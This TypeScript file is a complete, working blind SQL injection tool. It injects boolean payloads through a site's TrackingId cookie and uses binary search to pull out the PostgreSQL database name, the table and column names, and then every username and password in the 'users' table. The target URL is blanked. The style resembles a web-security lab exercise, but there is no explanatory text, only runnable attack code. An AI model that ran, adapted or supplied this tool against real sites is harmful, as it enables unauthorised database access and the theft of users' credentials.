import pRetry from "p-retry";

const siteUrl = "....................";

let httpReqCount = 0;

const MIN_PRINTABLE_ASCII = 32;

interface CookieHeaders {
  trackingId: string;
  session: string;
}
async function fetchCookieHeaders(): Promise<CookieHeaders> {
  const response = await fetch(siteUrl);
  if (response.status !== 200) throw new Error("Failed to fetch the page");
  const cookies = response.headers.get("set-cookie");
  if (cookies == null) throw new Error("Failed to get the cookie");
  console.log(cookies);
  const trackingId = cookies.match(/TrackingId=(.*?);/)?.[1];
  const session = cookies.match(/session=(.*?);/)?.[1];
  if (trackingId == null || session == null)
    throw new Error("Failed to extract the headers");

  return { trackingId: trackingId, session };
}

type IsCharCodeGreaterThan = (
  charCodeToGuess: number,
  index: number,
  cookieHeaders: CookieHeaders
) => Promise<boolean>;

async function findCharacterUsingBinarySearch(
  index: number,
  cookieHeaders: CookieHeaders,
  isGreaterThan: IsCharCodeGreaterThan
): Promise<string> {
  let lowerBound = MIN_PRINTABLE_ASCII;
  let upperBound = 255;

  while (lowerBound < upperBound) {
    const mid = Math.floor((lowerBound + upperBound) / 2);
    const isGreater = await isGreaterThan(mid, index, cookieHeaders);
    httpReqCount++;

    if (isGreater) lowerBound = mid + 1;
    else upperBound = mid;
  }

  return String.fromCharCode(lowerBound);
}

const sendBooleanQuery = async (
  cookieHeaders: CookieHeaders,
  query: string
): Promise<boolean> => {
  return pRetry(
    async () => {
      try {
        const Cookie = `TrackingId=${cookieHeaders.trackingId}${query}; session=${cookieHeaders.session}`;
        // console.log("[i] Querying:", query);
        const response = await fetch(siteUrl, {
          headers: {
            Cookie,
          },
        });
        if (response.status !== 200) {
          console.log("[!] Failed to fetch the page, status:", response.status);
          throw new Error("Failed to fetch the page");
        }
        const responseText = await response.text();
        return responseText.toLowerCase().includes("welcome");
      } catch (error) {
        if (!(error instanceof Error)) throw error;
        console.log(`[!] Error: ${error.message}`);
        throw error;
      }
    },
    {
      retries: 5,
    }
  );
};

const checkSiteVulnerability = async (
  cookieHeaders: CookieHeaders
): Promise<boolean> => {
  const query1 = "' and 1=1 --";
  const isVuln1 = await sendBooleanQuery(cookieHeaders, query1);
  const query2 = "' and 1=2 --";
  const isVuln2 = await sendBooleanQuery(cookieHeaders, query2);
  return isVuln1 && !isVuln2;
};

type DBMS =
  | "MySQL"
  | "PostgreSQL"
  | "SQLite"
  | "Oracle"
  | "Microsoft SQL Server";

const detectDbmsType = async (cookieHeaders: CookieHeaders): Promise<DBMS> => {
  console.log("[*] Detecting DBMS...");
  const postgreSQLQuery =
    "' and current_setting('server_version') = current_setting('server_version') --";
  const isPostgreSQL = await sendBooleanQuery(cookieHeaders, postgreSQLQuery);
  console.log("[i] PostgreSQL:", isPostgreSQL);
  if (isPostgreSQL) return "PostgreSQL";
  else throw new Error("DBMS not detected");
};

const dbNameIsGreaterThanPostgres: IsCharCodeGreaterThan = async (
  charCodeToGuess: number,
  index: number,
  cookieHeaders: CookieHeaders
): Promise<boolean> => {
  const query = `' AND ascii(substring(current_database(),${
    index + 1
  },1))>${charCodeToGuess} --`;
  return sendBooleanQuery(cookieHeaders, query);
};

async function guessResourceLength(
  cookieHeaders: CookieHeaders,
  queryMaker: (value: number) => string
): Promise<number> {
  let lower = 0;
  let upper = 10;
  while (true) {
    console.log("[i] Probing:", lower, upper);
    const query = queryMaker(upper);
    if (await sendBooleanQuery(cookieHeaders, query)) {
      break;
    }
    lower = upper + 1;
    upper += 10;
  }
  while (lower < upper) {
    console.log("[i] Binary search:", lower, upper);
    const mid = Math.floor((lower + upper) / 2);
    if (await sendBooleanQuery(cookieHeaders, queryMaker(mid))) {
      upper = mid;
    } else {
      lower = mid + 1;
    }
  }
  return lower;
}

const getPostgresDatabaseNameLength = async (
  cookieHeaders: CookieHeaders
): Promise<number> => {
  return guessResourceLength(cookieHeaders, (val) => {
    return `' AND length(current_database()) <= ${val} --`;
  });
};

const getPostgresTablesCount = async (
  cookieHeaders: CookieHeaders
): Promise<number> => {
  return guessResourceLength(cookieHeaders, (val) => {
    return `' AND (SELECT count(table_name) FROM information_schema.tables WHERE table_schema='public') <= ${val} --`;
  });
};

const getSingleTableNameLength = async (
  cookieHeaders: CookieHeaders,
  index: number
): Promise<number> => {
  return guessResourceLength(cookieHeaders, (val) => {
    return `' AND length((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET ${index})) <= ${val} --`;
  });
};

const getColsCount = async (
  cookieHeaders: CookieHeaders,
  tableName: string
): Promise<number> => {
  return guessResourceLength(cookieHeaders, (val) => {
    return `' AND (SELECT count(column_name) FROM information_schema.columns WHERE table_name='${tableName}') <= ${val} --`;
  });
};

const getSingleColNameLength = async (
  cookieHeaders: CookieHeaders,
  tableName: string,
  index: number
): Promise<number> => {
  return guessResourceLength(cookieHeaders, (val) => {
    return `' AND length((SELECT column_name FROM information_schema.columns WHERE table_name='${tableName}' LIMIT 1 OFFSET ${index})) <= ${val} --`;
  });
};

const getTableRowsCount = async (
  cookieHeaders: CookieHeaders,
  tableName: string
): Promise<number> => {
  return guessResourceLength(cookieHeaders, (val) => {
    return `' AND (SELECT count(*) FROM ${tableName}) <= ${val} --`;
  });
};

const getDatabaseName = async (
  cookieHeaders: CookieHeaders,
  dbNameLength: number
): Promise<string> => {
  const checkPromises: Promise<string>[] = [];
  for (let i = 0; i < dbNameLength; i++) {
    checkPromises.push(
      findCharacterUsingBinarySearch(
        i,
        cookieHeaders,
        dbNameIsGreaterThanPostgres
      )
    );
  }

  return (await Promise.all(checkPromises)).join("");
};

const getPostgresTableName = async (
  cookieHeaders: CookieHeaders,
  tableLength: number,
  rowIndex: number
): Promise<string> => {
  const checkPromises: Promise<string>[] = [];
  for (let i = 0; i < tableLength; i++) {
    checkPromises.push(
      findCharacterUsingBinarySearch(
        i,
        cookieHeaders,
        createTableNameIsGreaterThanPostgres(rowIndex)
      )
    );
  }

  return (await Promise.all(checkPromises)).join("");
};

const createTableNameIsGreaterThanPostgres = (
  rowIndex: number
): IsCharCodeGreaterThan => {
  return async (
    charCodeToGuess: number,
    index: number,
    cookieHeaders: CookieHeaders
  ) => {
    const query = `' AND ascii(substring((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET ${rowIndex}),${
      index + 1
    },1))>${charCodeToGuess} --`;
    return sendBooleanQuery(cookieHeaders, query);
  };
};

const fetchDatabaseName = async (cookieHeaders: CookieHeaders) => {
  const dbms = await detectDbmsType(cookieHeaders);
  if (dbms !== "PostgreSQL") throw new Error("DBMS is not PostgreSQL");

  const dbCount = await getPostgresDatabaseNameLength(cookieHeaders);
  console.log("[*] Database name length:", dbCount);

  const databaseName = await getDatabaseName(cookieHeaders, dbCount);

  if (databaseName)
    console.log("Success-dbname:", databaseName, { httpReqCount });
  else throw new Error("Failed to find the word");

  return databaseName;
};

const getTableNameByRowIndex = async (
  cookieHeaders: CookieHeaders,
  rowIndex: number
) => {
  const tableLength = await getSingleTableNameLength(cookieHeaders, rowIndex);
  const tableName = await getPostgresTableName(
    cookieHeaders,
    tableLength,
    rowIndex
  );
  console.log("Success-table:", tableName, { httpReqCount });
  return tableName;
};

const getColName = async (
  cookieHeaders: CookieHeaders,
  tableName: string,
  colNameLength: number,
  colIndex: number
): Promise<string> => {
  const checkPromises: Promise<string>[] = [];
  for (let i = 0; i < colNameLength; i++) {
    checkPromises.push(
      findCharacterUsingBinarySearch(
        i,
        cookieHeaders,
        createColNameIsGreaterThanPostgres(tableName, colIndex)
      )
    );
  }

  return (await Promise.all(checkPromises)).join("");
};

const createColNameIsGreaterThanPostgres = (
  tableName: string,
  colIndex: number
): IsCharCodeGreaterThan => {
  return async (
    charCodeToGuess: number,
    index: number,
    cookieHeaders: CookieHeaders
  ) => {
    const query = `' AND ascii(substring((SELECT column_name FROM information_schema.columns WHERE table_name='${tableName}' LIMIT 1 OFFSET ${colIndex}),${
      index + 1
    },1))>${charCodeToGuess} --`;
    return sendBooleanQuery(cookieHeaders, query);
  };
};

const getColNameByIndex = async (
  cookieHeaders: CookieHeaders,
  tableName: string,
  index: number
) => {
  const colLength = await getSingleColNameLength(
    cookieHeaders,
    tableName,
    index
  );
  const colName = await getColName(cookieHeaders, tableName, colLength, index);
  console.log("Success-col:", colName, { httpReqCount });
  return colName;
};

const fetchTableNames = async (cookieHeaders: CookieHeaders) => {
  const tableCount = await getPostgresTablesCount(cookieHeaders);
  console.log("[*] Table count:", tableCount);
  const tables: Promise<string>[] = [];
  for (let i = 0; i < tableCount; i++) {
    tables.push(getTableNameByRowIndex(cookieHeaders, i));
  }
  const tablesNames = await Promise.all(tables);
  console.log(tablesNames);
  return tablesNames;
};

const fetchColumnNames = async (
  cookieHeaders: CookieHeaders,
  tableName: string
) => {
  const colCount = await getColsCount(cookieHeaders, tableName);
  console.log("[*] Column count:", colCount);
  const cols: Promise<string>[] = [];
  for (let i = 0; i < colCount; i++) {
    cols.push(getColNameByIndex(cookieHeaders, tableName, i));
  }
  const colNames = await Promise.all(cols);
  console.log(colNames);
  return colNames;
};

const createRowContentIsGreaterThanPostgres = (
  colName: string,
  tableName: string,
  rowIndex: number
): IsCharCodeGreaterThan => {
  return async (
    charCodeToGuess: number,
    index: number,
    cookieHeaders: CookieHeaders
  ) => {
    const query = `' AND ascii(substring((SELECT ${colName} FROM ${tableName} LIMIT 1 OFFSET ${rowIndex}),${
      index + 1
    },1))>${charCodeToGuess} --`;
    return sendBooleanQuery(cookieHeaders, query);
  };
};

const getRowLength = async (
  cookieHeaders: CookieHeaders,
  tableName: string,
  colName: string,
  index: number
): Promise<number> => {
  return guessResourceLength(cookieHeaders, (val) => {
    return `' AND length((SELECT ${colName} FROM ${tableName} LIMIT 1 OFFSET ${index})) <= ${val} --`;
  });
};

const extractRowContent = async (
  cookieHeaders: CookieHeaders,
  tableName: string,
  colName: string,
  rowIndex: number,
  rowLength: number
): Promise<string> => {
  const checkPromises: Promise<string>[] = [];
  for (let i = 0; i < rowLength; i++) {
    checkPromises.push(
      findCharacterUsingBinarySearch(
        i,
        cookieHeaders,
        createRowContentIsGreaterThanPostgres(colName, tableName, rowIndex)
      )
    );
  }

  return (await Promise.all(checkPromises)).join("");
};
(async () => {
  console.log("[*] Extracting headers...");
  const cookieHeaders = await fetchCookieHeaders();
  console.log("[*] Headers extracted:", cookieHeaders);

  console.log("[*] Checking if the site is vulnerable...");
  const isVuln = await checkSiteVulnerability(cookieHeaders);
  if (!isVuln) {
    console.log("[!] The site is not vulnerable to SQL injection");
    throw new Error("The site is not vulnerable");
  }

  console.log("db", await fetchDatabaseName(cookieHeaders));

  console.log("tables", await fetchTableNames(cookieHeaders));

  const userCols = await fetchColumnNames(cookieHeaders, "users");
  console.log("userCols:", userCols);
  const rowsCount = await getTableRowsCount(cookieHeaders, "users");
  console.log("rowsCount:", rowsCount);
  for (let i = 0; i < rowsCount; i++) {
    console.log("users.row:", i);
    const table = "users";
    const usernameColName = userCols[0] as string;
    const passwordColName = userCols[1] as string;
    const rowUsernameLength = await getRowLength(
      cookieHeaders,
      table,
      usernameColName,
      i
    );
    console.log(
      usernameColName,
      await extractRowContent(
        cookieHeaders,
        table,
        usernameColName,
        i,
        rowUsernameLength
      )
    );

    const rowPasswordLength = await getRowLength(
      cookieHeaders,
      table,
      passwordColName,
      i
    );
    console.log(
      passwordColName,
      await extractRowContent(
        cookieHeaders,
        table,
        passwordColName,
        i,
        rowPasswordLength
      )
    );
  }
})();
